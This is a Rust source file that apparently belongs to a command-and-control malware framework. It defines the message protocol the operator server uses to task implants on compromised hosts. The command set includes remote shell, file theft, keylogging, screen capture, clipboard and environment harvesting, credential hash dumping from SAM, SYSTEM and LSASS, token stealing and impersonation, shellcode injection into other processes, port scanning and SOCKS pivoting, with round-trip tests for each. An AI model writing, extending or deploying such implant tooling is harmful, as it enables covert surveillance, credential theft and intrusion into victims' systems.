//! Task/response/message types and their (de)serialisation via [`crate::wire`].

use crate::wire::{Reader, WireError, Writer};
use alloc::string::String;
use alloc::vec::Vec;

/// Upper bound on any length-prefixed batch (tasks, responses, BOF args).
/// Real batches are tiny (a handful of items per beacon cycle); anything past
/// this is malformed or an allocation-bomb attempt. Defense-in-depth against a
/// malicious/compromised implant whose decrypted body could otherwise drive a
/// `Vec::with_capacity(u32::MAX)` on the server.
const MAX_BATCH: usize = 65_536;

/// Hard cap on per-cycle command/arg element counts (tasks dispatched to an
/// implant, BOF args). Legitimate payloads never exceed a few dozen items per
/// beacon cycle; 256 is a generous ceiling. This is a *secondary* guard — the
/// primary allocation guard is [`MAX_BATCH`] — applied directly to the loop
/// iteration count so that even if the allocation guard is somehow bypassed the
/// decoder still terminates in bounded time.
///
/// **NOT applied to [`TaskResponse`] batches** — those carry `FileChunk`/BOF
/// output streams that legitimately run into thousands of items per cycle (a
/// 10 MiB download at 64 KiB chunks = 160 chunks; large uploads far exceed that).
/// Truncating responses at 256 silently drops file-tail chunks. Result batches
/// use [`MAX_BATCH`] (65536) as their only wire cap; per-session buffering is
/// bounded by the server's `MAX_RESULTS_PER_SESSION` eviction instead.
const MAX_WIRE_COUNT: usize = 256;

/// Validate a length-prefixed element count read off the wire. Returns the
/// count to allocate for, capped at the remaining input (a hard upper bound:
/// you can't have more elements than unread bytes, since each element is at
/// least one byte) and at [`MAX_BATCH`]. Errors with [`WireError::BadLen`] on
/// an absurd declared count so the caller never calls `Vec::with_capacity` with
/// an attacker-influenced u32.
fn checked_count(r: &mut Reader, declared: u32) -> Result<usize, WireError> {
    if declared as usize > MAX_BATCH {
        return Err(WireError::BadLen(declared as usize));
    }
    // Reserve only what could plausibly be read — never more than remaining.
    Ok((declared as usize).min(r.remaining()))
}

fn checked_str(r: &mut Reader, max_len: usize) -> Result<String, WireError> {
    let b = r.blob()?;
    if b.len() > max_len {
        return Err(WireError::BadLen(b.len()));
    }
    String::from_utf8(b.to_vec()).map_err(|_| WireError::Utf8)
}

/// Initial check-in metadata an implant sends on first contact.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SessionInfo {
    pub beacon_id: u32,
    pub hostname: String,
    pub username: String,
    pub os: String,
    /// 0 = x86_64, 1 = aarch64, 2 = x86
    pub arch: u8,
    pub pid: u32,
    /// 0 = no, 1 = elevated/admin
    pub is_admin: u8,
    /// One-time auth token (32 bytes). `None` = legacy implant (no token).
    /// When present, the server validates it against the implants table before
    /// accepting the session. The token is inside the encrypted payload, NOT
    /// the frame AAD — the AAD remains the implant's X25519 pubkey.
    pub auth_token: Option<[u8; 32]>,
}

impl SessionInfo {
    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
        w.u32(self.beacon_id);
        w.str(&self.hostname)?;
        w.str(&self.username)?;
        w.str(&self.os)?;
        w.u8(self.arch);
        w.u32(self.pid);
        w.u8(self.is_admin);
        // auth_token: presence byte (0=absent, 1=present) + blob if present.
        // Backward-compatible: old implants stop after is_admin; the decoder
        // checks remaining bytes before attempting to read the token.
        match self.auth_token {
            Some(ref token) => {
                w.u8(1);
                w.blob(token)?;
            }
            None => {
                w.u8(0);
            }
        }
        Ok(())
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        let info = Self {
            beacon_id: r.u32()?,
            hostname: checked_str(r, 256)?,
            username: checked_str(r, 256)?,
            os: checked_str(r, 256)?,
            arch: r.u8()?,
            pid: r.u32()?,
            is_admin: r.u8()?,
            // Backward-compat: only read auth_token if bytes remain.
            // Old implants stop after is_admin; new ones append a presence
            // byte (0 = no token, 1 = blob of 32B token follows).
            auth_token: if r.remaining() > 0 {
                match r.u8()? {
                    0 => None,
                    1 => {
                        let b = r.blob()?;
                        if b.len() != 32 {
                            return Err(WireError::BadLen(b.len()));
                        }
                        let mut token = [0u8; 32];
                        token.copy_from_slice(b);
                        Some(token)
                    }
                    v => return Err(WireError::BadTag(v)),
                }
            } else {
                None
            },
        };
        Ok(info)
    }
}

/// A task the server queues for an implant.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    Ping,
    /// Reschedule beaconing: sleep `seconds` (+/- `jitter_pct`%).
    Sleep {
        seconds: u32,
        jitter_pct: u8,
    },
    /// Run a shell command (`/bin/sh -c` / `cmd.exe /c`).
    Shell {
        args: String,
    },
    /// Write `data` to a file named `name` on the target (no fixed path yet).
    Upload {
        name: String,
        data: Vec<u8>,
    },
    /// Read `path` off the target (streamed back as FileChunks).
    Download {
        path: String,
    },
    /// Tear down the session cleanly.
    Exit,
    /// Execute a COFF/BOF object: `name` is a short entry label, `args` are
    /// string arguments, `blob` is the raw COFF bytes.
    Bof {
        name: String,
        args: Vec<String>,
        blob: Vec<u8>,
    },
    /// Open an outbound connection from the implant (TCP for P2P / rportfwd).
    /// `proto` 0 = TCP; `chan` is a server-assigned channel id.
    Connect {
        proto: u8,
        host: String,
        port: u16,
        chan: u32,
    },
    /// SOCKS5 relay control on a channel (`op` is a SOCKS opcode).
    Socks {
        chan: u32,
        op: u8,
        addr: String,
        port: u16,
    },
    /// 文件系统操作：cd / mkdir / rm / mv / cp。
    /// `dest` 仅 Mv/Cp 需要，其余为 None。
    FileOp {
        op: FileOp,
        path: String,
        dest: Option<String>,
    },
    /// 截屏。`monitor` 0=主屏，返回 PNG 数据（Response::Image）。
    Screenshot {
        monitor: u8,
    },
    /// 端口扫描。扫描 `host` 的 `ports`（逗号分隔，如 "22,80,443" 或 "1-1000"）。
    Portscan {
        host: String,
        ports: String,
    },
    /// 网络信息收集（ifconfig/arp/netstat/route）。
    Net {
        query: String,
    },
    /// 磁盘/分区信息（df/diskutil）。
    DriveInfo,
    /// 读取剪贴板内容。
    Clipboard,
    /// 环境变量收集。`name` 空=全部，否则取单个变量。
    Env {
        name: String,
    },
    /// 键盘记录。`action` 0=start, 1=stop, 2=dump（返回已捕获的键）。
    Keylog {
        action: u8,
    },
    /// 持续截屏（定时截图，`interval_secs` 秒一张）。
    Screenwatch {
        interval_secs: u32,
    },
    /// 凭据哈希提取。`method` 语义（跨后端统一约定）：
    ///   - 0 = SAM hive（Windows，加密，需配 SYSTEM hive 离线解 NTLM）
    ///   - 1 = SYSTEM hive（Windows，boot-key 源）
    ///   - 2 = LSASS 内存 dump（预留；最响的 IOC，所有后端暂返回 deferred）
    ///   - 3 = macOS shadow hash（agent-dev，读 dslocal plist）
    ///     数字 0/1 在 implant-win 上行为不变（旧 beacon 兼容）；agent-dev 的
    ///     method=1 从 shadow 改为 SYSTEM（macOS 返回 unsupported），shadow 挪到 3。
    Hashdump {
        method: u8,
    },
    /// Write `data` to an open relay channel's socket — the operator→implant
    /// direction of the SOCKS / rportfwd relay. `chan` is the id a prior
    /// `Connect`/`Socks` returned. Mirrors `Response::Channel { status: 1, data }`
    /// which carries bytes the OTHER way (socket→operator).
    ChannelData {
        chan: u32,
        data: Vec<u8>,
    },
    /// Close a relay channel's socket and drop it from the implant's channel
    /// table. The implant also auto-closes on socket EOF/error (emitting
    /// `Response::Channel { status: 2 (closed) }`), so this is for explicit
    /// operator-initiated teardown.
    ChannelClose {
        chan: u32,
    },
    /// Steal (duplicate) the primary token of `pid` and hold it process-wide for
    /// later impersonation. A prior stolen/made token is closed first. Pairs with
    /// [`Command::Rev2Self`] / [`Command::GetUid`]. Lateral-movement primitive.
    StealToken {
        pid: u32,
    },
    /// Make a new logon token via `LogonUser` (make-token / pass-the-password).
    /// `domain`\`user` + `password`; `logon_type` 1=interactive(default),
    /// 2=network, 3=new-credentials. The resulting token is held process-wide
    /// (overrides a prior stolen/made token).
    MakeToken {
        domain: String,
        user: String,
        password: String,
        logon_type: u8,
    },
    /// Drop the current thread's impersonation (RevertToSelf) but KEEP the held
    /// token for reuse. Pairs with [`Command::StealToken`] / [`Command::MakeToken`].
    Rev2Self,
    /// Report the current thread identity. Output text = `DOMAIN\user` (+ a marker
    /// if a stolen/made token is held). Lets the operator confirm who executes.
    GetUid,
    /// Inject shellcode into a target process. `method` selects the technique
    /// (0 = Pool Party thread-pool / section-backed, 1 = threadless HWBP, 2 =
    /// module stomp). `pid` is the target process (0 = spawn a sacrificial
    /// process instead, using `spawn_to`). `shellcode` is the raw payload.
    Inject {
        method: u8,
        pid: u32,
        spawn_to: String,
        shellcode: Vec<u8>,
    },
    Trex,
    SetChannel {
        channel: u8,
    },
}

/// 文件操作的种类（u8 tag 0-4）。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FileOp {
    Cd,
    Mkdir,
    Rm,
    Mv,
    Cp,
}

impl FileOp {
    pub fn encode(self, w: &mut Writer) {
        w.u8(match self {
            FileOp::Cd => 0,
            FileOp::Mkdir => 1,
            FileOp::Rm => 2,
            FileOp::Mv => 3,
            FileOp::Cp => 4,
        });
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(match r.u8()? {
            0 => FileOp::Cd,
            1 => FileOp::Mkdir,
            2 => FileOp::Rm,
            3 => FileOp::Mv,
            4 => FileOp::Cp,
            t => return Err(WireError::BadTag(t)),
        })
    }
}

impl Command {
    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
        match self {
            Command::Ping => w.u8(1),
            Command::Sleep {
                seconds,
                jitter_pct,
            } => {
                w.u8(2);
                w.u32(*seconds);
                w.u8(*jitter_pct);
            }
            Command::Shell { args } => {
                w.u8(3);
                w.str(args)?;
            }
            Command::Upload { name, data } => {
                w.u8(4);
                w.str(name)?;
                w.blob(data)?;
            }
            Command::Download { path } => {
                w.u8(5);
                w.str(path)?;
            }
            Command::Exit => w.u8(6),
            Command::Bof { name, args, blob } => {
                w.u8(7);
                w.str(name)?;
                w.u32(args.len().min(MAX_WIRE_COUNT) as u32);
                for a in args.iter().take(MAX_WIRE_COUNT) {
                    w.str(a)?;
                }
                w.blob(blob)?;
            }
            Command::Connect {
                proto,
                host,
                port,
                chan,
            } => {
                w.u8(8);
                w.u8(*proto);
                w.str(host)?;
                w.u16(*port);
                w.u32(*chan);
            }
            Command::Socks {
                chan,
                op,
                addr,
                port,
            } => {
                w.u8(9);
                w.u32(*chan);
                w.u8(*op);
                w.str(addr)?;
                w.u16(*port);
            }
            Command::FileOp { op, path, dest } => {
                w.u8(10);
                op.encode(w);
                w.str(path)?;
                match dest {
                    Some(d) => {
                        w.u8(1);
                        w.str(d)?;
                    }
                    None => w.u8(0),
                }
            }
            Command::Screenshot { monitor } => {
                w.u8(11);
                w.u8(*monitor);
            }
            Command::Portscan { host, ports } => {
                w.u8(12);
                w.str(host)?;
                w.str(ports)?;
            }
            Command::Net { query } => {
                w.u8(13);
                w.str(query)?;
            }
            Command::DriveInfo => w.u8(14),
            Command::Clipboard => w.u8(15),
            Command::Env { name } => {
                w.u8(16);
                w.str(name)?;
            }
            Command::Keylog { action } => {
                w.u8(17);
                w.u8(*action);
            }
            Command::Screenwatch { interval_secs } => {
                w.u8(18);
                w.u32(*interval_secs);
            }
            Command::Hashdump { method } => {
                w.u8(19);
                w.u8(*method);
            }
            Command::ChannelData { chan, data } => {
                w.u8(20);
                w.u32(*chan);
                w.blob(data)?;
            }
            Command::ChannelClose { chan } => {
                w.u8(21);
                w.u32(*chan);
            }
            Command::StealToken { pid } => {
                w.u8(22);
                w.u32(*pid);
            }
            Command::MakeToken {
                domain,
                user,
                password,
                logon_type,
            } => {
                w.u8(23);
                w.str(domain)?;
                w.str(user)?;
                w.str(password)?;
                w.u8(*logon_type);
            }
            Command::Rev2Self => w.u8(24),
            Command::GetUid => w.u8(25),
            Command::Inject {
                method,
                pid,
                spawn_to,
                shellcode,
            } => {
                w.u8(26);
                w.u8(*method);
                w.u32(*pid);
                w.str(spawn_to)?;
                w.blob(shellcode)?;
            }
            Command::Trex => w.u8(27),
            Command::SetChannel { channel } => {
                w.u8(28);
                w.u8(*channel);
            }
        }
        Ok(())
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(match r.u8()? {
            1 => Command::Ping,
            2 => Command::Sleep {
                seconds: r.u32()?,
                jitter_pct: r.u8()?,
            },
            3 => Command::Shell {
                args: checked_str(r, 4096)?,
            },
            4 => Command::Upload {
                name: checked_str(r, 4096)?,
                data: r.blob()?.to_vec(),
            },
            5 => Command::Download {
                path: checked_str(r, 4096)?,
            },
            6 => Command::Exit,
            7 => {
                let name = checked_str(r, 256)?;
                let n_raw = r.u32()?;
                let cap = checked_count(r, n_raw)?;
                let n = (n_raw as usize).min(MAX_WIRE_COUNT);
                let mut args = Vec::with_capacity(cap);
                for _ in 0..n {
                    args.push(checked_str(r, 4096)?);
                }
                let blob = r.blob()?.to_vec();
                Command::Bof { name, args, blob }
            }
            8 => Command::Connect {
                proto: r.u8()?,
                host: checked_str(r, 512)?,
                port: r.u16()?,
                chan: r.u32()?,
            },
            9 => Command::Socks {
                chan: r.u32()?,
                op: r.u8()?,
                addr: checked_str(r, 512)?,
                port: r.u16()?,
            },
            10 => {
                let op = FileOp::decode(r)?;
                let path = checked_str(r, 4096)?;
                let dest = if r.u8()? == 1 {
                    Some(checked_str(r, 4096)?)
                } else {
                    None
                };
                Command::FileOp { op, path, dest }
            }
            11 => Command::Screenshot { monitor: r.u8()? },
            12 => Command::Portscan {
                host: checked_str(r, 512)?,
                ports: checked_str(r, 512)?,
            },
            13 => Command::Net {
                query: checked_str(r, 512)?,
            },
            14 => Command::DriveInfo,
            15 => Command::Clipboard,
            16 => Command::Env {
                name: checked_str(r, 256)?,
            },
            17 => Command::Keylog { action: r.u8()? },
            18 => Command::Screenwatch {
                interval_secs: r.u32()?,
            },
            19 => Command::Hashdump { method: r.u8()? },
            20 => Command::ChannelData {
                chan: r.u32()?,
                data: r.blob()?.to_vec(),
            },
            21 => Command::ChannelClose { chan: r.u32()? },
            22 => Command::StealToken { pid: r.u32()? },
            23 => Command::MakeToken {
                domain: checked_str(r, 256)?,
                user: checked_str(r, 256)?,
                password: checked_str(r, 256)?,
                logon_type: r.u8()?,
            },
            24 => Command::Rev2Self,
            25 => Command::GetUid,
            26 => {
                let method = r.u8()?;
                let pid = r.u32()?;
                let spawn_to = checked_str(r, 4096)?;
                let shellcode = r.blob()?.to_vec();
                Command::Inject {
                    method,
                    pid,
                    spawn_to,
                    shellcode,
                }
            }
            27 => Command::Trex,
            28 => Command::SetChannel { channel: r.u8()? },
            t => return Err(WireError::BadTag(t)),
        })
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Response {
    /// Raw command/process output.
    Output(Vec<u8>),
    /// Empty success acknowledgement.
    Ok,
    /// An error occurred on the implant.
    Err(String),
    /// A chunk of a downloaded file (`eof == 1` marks the final chunk).
    FileChunk {
        name: String,
        seq: u32,
        eof: u8,
        data: Vec<u8>,
    },
    /// stdout/stderr produced by a BOF execution.
    BofOutput(Vec<u8>),
    /// A data-channel update for `Connect`/`Socks` (status: 0=open, 1=data,
    /// 2=closed, 3=error).
    Channel {
        chan: u32,
        status: u8,
        data: Vec<u8>,
    },
    /// 截屏图像数据（PNG 字节流）。
    Image(Vec<u8>),
}

impl Response {
    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
        match self {
            Response::Output(d) => {
                w.u8(1);
                w.blob(d)?;
            }
            Response::Ok => w.u8(2),
            Response::Err(m) => {
                w.u8(3);
                w.str(m)?;
            }
            Response::FileChunk {
                name,
                seq,
                eof,
                data,
            } => {
                w.u8(4);
                w.str(name)?;
                w.u32(*seq);
                w.u8(*eof);
                w.blob(data)?;
            }
            Response::BofOutput(d) => {
                w.u8(5);
                w.blob(d)?;
            }
            Response::Channel { chan, status, data } => {
                w.u8(6);
                w.u32(*chan);
                w.u8(*status);
                w.blob(data)?;
            }
            Response::Image(d) => {
                w.u8(7);
                w.blob(d)?;
            }
        }
        Ok(())
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(match r.u8()? {
            1 => Response::Output(r.blob()?.to_vec()),
            2 => Response::Ok,
            3 => Response::Err(checked_str(r, 4096)?),
            4 => {
                let name = checked_str(r, 4096)?;
                let seq = r.u32()?;
                let eof_raw = r.u8()?;
                if eof_raw > 1 {
                    return Err(WireError::BadTag(eof_raw));
                }
                let data = r.blob()?.to_vec();
                Response::FileChunk {
                    name,
                    seq,
                    eof: eof_raw,
                    data,
                }
            }
            5 => Response::BofOutput(r.blob()?.to_vec()),
            6 => Response::Channel {
                chan: r.u32()?,
                status: r.u8()?,
                data: r.blob()?.to_vec(),
            },
            7 => Response::Image(r.blob()?.to_vec()),
            t => return Err(WireError::BadTag(t)),
        })
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Task {
    pub task_id: u64,
    pub command: Command,
}

impl Task {
    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
        w.u64(self.task_id);
        self.command.encode(w)?;
        Ok(())
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(Self {
            task_id: r.u64()?,
            command: Command::decode(r)?,
        })
    }

    /// Encode a batch: `u32 count` followed by each task. Returns the first
    /// writer error encountered (e.g. a blob exceeding `wire::MAX_BLOB_LEN`).
    pub fn encode_vec(tasks: &[Task]) -> Result<Vec<u8>, WireError> {
        let mut w = Writer::new();
        w.u32(tasks.len().min(MAX_WIRE_COUNT) as u32);
        for t in tasks.iter().take(MAX_WIRE_COUNT) {
            t.encode(&mut w)?;
        }
        Ok(w.into_bytes())
    }

    pub fn decode_vec(data: &[u8]) -> Result<Vec<Task>, WireError> {
        let mut r = Reader::new(data);
        let n_raw = r.u32()?;
        let cap = checked_count(&mut r, n_raw)?;
        let n = (n_raw as usize).min(MAX_WIRE_COUNT);
        let mut out = Vec::with_capacity(cap);
        for _ in 0..n {
            out.push(Task::decode(&mut r)?);
        }
        Ok(out)
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TaskResponse {
    pub task_id: u64,
    pub response: Response,
}

impl TaskResponse {
    pub fn encode(&self, w: &mut Writer) -> Result<(), WireError> {
        w.u64(self.task_id);
        self.response.encode(w)?;
        Ok(())
    }

    pub fn decode(r: &mut Reader) -> Result<Self, WireError> {
        Ok(Self {
            task_id: r.u64()?,
            response: Response::decode(r)?,
        })
    }

    pub fn encode_vec(rs: &[TaskResponse]) -> Result<Vec<u8>, WireError> {
        let mut w = Writer::new();
        w.u32(rs.len().min(MAX_BATCH) as u32);
        for r in rs.iter().take(MAX_BATCH) {
            r.encode(&mut w)?;
        }
        Ok(w.into_bytes())
    }

    pub fn decode_vec(data: &[u8]) -> Result<Vec<TaskResponse>, WireError> {
        let mut r = Reader::new(data);
        let n_raw = r.u32()?;
        let cap = checked_count(&mut r, n_raw)?;
        // Results stream FileChunk / BOF output and legitimately run into the
        // thousands per cycle — do NOT apply MAX_WIRE_COUNT (256) here, it would
        // silently drop file-tail chunks. `checked_count` already bounds the
        // allocation at MAX_BATCH (65536) and the per-session buffer is evicted
        // server-side past MAX_RESULTS_PER_SESSION.
        let n = (n_raw as usize).min(MAX_BATCH).min(cap);
        let mut out = Vec::with_capacity(n);
        for _ in 0..n {
            out.push(TaskResponse::decode(&mut r)?);
        }
        Ok(out)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 编码再解码一个 Command，验证 round-trip 相等。
    fn round_trip(cmd: Command) -> Command {
        let mut w = Writer::new();
        cmd.encode(&mut w)
            .expect("encode should succeed for test fixture");
        let bytes = w.into_bytes();
        let mut r = Reader::new(&bytes);
        Command::decode(&mut r).expect("decode 应成功")
    }

    #[test]
    fn fileop_mkdir_roundtrips() {
        let cmd = Command::FileOp {
            op: FileOp::Mkdir,
            path: "/tmp/x".into(),
            dest: None,
        };
        assert_eq!(round_trip(cmd.clone()), cmd);
    }

    #[test]
    fn fileop_mv_roundtrips_with_dest() {
        let cmd = Command::FileOp {
            op: FileOp::Mv,
            path: "/tmp/a".into(),
            dest: Some("/tmp/b".into()),
        };
        assert_eq!(round_trip(cmd.clone()), cmd);
    }

    #[test]
    fn fileop_all_variants_roundtrip() {
        let ops = [
            FileOp::Cd,
            FileOp::Mkdir,
            FileOp::Rm,
            FileOp::Mv,
            FileOp::Cp,
        ];
        for op in ops {
            let cmd = Command::FileOp {
                op,
                path: "p".into(),
                dest: Some("d".into()),
            };
            assert_eq!(
                round_trip(cmd.clone()),
                cmd,
                "FileOp::{op:?} roundtrip 失败"
            );
        }
    }

    #[test]
    fn connect_and_socks_still_roundtrip() {
        let connect = Command::Connect {
            proto: 0,
            host: "10.0.0.1".into(),
            port: 445,
            chan: 7,
        };
        assert_eq!(round_trip(connect.clone()), connect);
        let socks = Command::Socks {
            chan: 7,
            op: 1,
            addr: "127.0.0.1".into(),
            port: 8080,
        };
        assert_eq!(round_trip(socks.clone()), socks);
    }

    #[test]
    fn bad_fileop_tag_errors() {
        let mut w = Writer::new();
        w.u8(10);
        w.u8(99);
        let bytes = w.into_bytes();
        let mut r = Reader::new(&bytes);
        assert!(matches!(
            Command::decode(&mut r),
            Err(WireError::BadTag(99))
        ));
    }

    #[test]
    fn screenshot_roundtrips() {
        let cmd = Command::Screenshot { monitor: 0 };
        assert_eq!(round_trip(cmd.clone()), cmd);
        let cmd = Command::Screenshot { monitor: 2 };
        assert_eq!(round_trip(cmd.clone()), cmd);
    }

    #[test]
    fn portscan_roundtrips() {
        let cmd = Command::Portscan {
            host: "10.0.0.0/24".into(),
            ports: "22,80,443".into(),
        };
        assert_eq!(round_trip(cmd.clone()), cmd);
    }

    #[test]
    fn net_driveinfo_clipboard_env_roundtrip() {
        let net = Command::Net {
            query: "ifconfig".into(),
        };
        assert_eq!(round_trip(net.clone()), net);
        assert_eq!(round_trip(Command::DriveInfo), Command::DriveInfo);
        assert_eq!(round_trip(Command::Clipboard), Command::Clipboard);
        let env = Command::Env {
            name: "PATH".into(),
        };
        assert_eq!(round_trip(env.clone()), env);
        let env_all = Command::Env {
            name: String::new(),
        };
        assert_eq!(round_trip(env_all.clone()), env_all);
    }

    #[test]
    fn response_image_roundtrips() {
        let png = vec![0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A]; // PNG header
        let resp = Response::Image(png.clone());
        let mut w = Writer::new();
        resp.encode(&mut w)
            .expect("encode should succeed for test fixture");
        let bytes = w.into_bytes();
        let mut r = Reader::new(&bytes);
        let decoded = Response::decode(&mut r).unwrap();
        assert_eq!(decoded, Response::Image(png));
    }

    #[test]
    fn keylog_screenwatch_hashdump_roundtrip() {
        let kl = Command::Keylog { action: 0 };
        assert_eq!(round_trip(kl.clone()), kl);
        let kl_stop = Command::Keylog { action: 1 };
        assert_eq!(round_trip(kl_stop.clone()), kl_stop);
        let sw = Command::Screenwatch { interval_secs: 30 };
        assert_eq!(round_trip(sw.clone()), sw);
        let hd = Command::Hashdump { method: 0 };
        assert_eq!(round_trip(hd.clone()), hd);
    }

    #[test]
    fn channel_data_and_close_roundtrip() {
        // The relay's operator→implant direction. ChannelData carries arbitrary
        // bytes (hex on the JSON surface); ChannelClose is just a chan id.
        let d = Command::ChannelData {
            chan: 42,
            data: vec![0xde, 0xad, 0xbe, 0xef],
        };
        assert_eq!(round_trip(d.clone()), d);
        // Empty data is a valid (if useless) write — encode/decode must handle it.
        let d_empty = Command::ChannelData {
            chan: 7,
            data: Vec::new(),
        };
        assert_eq!(round_trip(d_empty.clone()), d_empty);
        let c = Command::ChannelClose { chan: 42 };
        assert_eq!(round_trip(c.clone()), c);
    }

    #[test]
    fn token_ops_roundtrip() {
        let steal = Command::StealToken { pid: 1337 };
        assert_eq!(round_trip(steal.clone()), steal);
        let mk = Command::MakeToken {
            domain: "CORP".into(),
            user: "jdoe".into(),
            password: "P@ssw0rd!".into(),
            logon_type: 1,
        };
        assert_eq!(round_trip(mk.clone()), mk);
        // Empty domain (local account) + network logon must survive.
        let mk_local = Command::MakeToken {
            domain: String::new(),
            user: "svc".into(),
            password: String::new(),
            logon_type: 2,
        };
        assert_eq!(round_trip(mk_local.clone()), mk_local);
        assert_eq!(round_trip(Command::Rev2Self), Command::Rev2Self);
        assert_eq!(round_trip(Command::GetUid), Command::GetUid);
        assert_eq!(
            round_trip(Command::Inject {
                method: 0,
                pid: 1234,
                spawn_to: "notepad.exe".into(),
                shellcode: vec![0x90, 0xC3],
            }),
            Command::Inject {
                method: 0,
                pid: 1234,
                spawn_to: "notepad.exe".into(),
                shellcode: vec![0x90, 0xC3],
            }
        );
    }
}
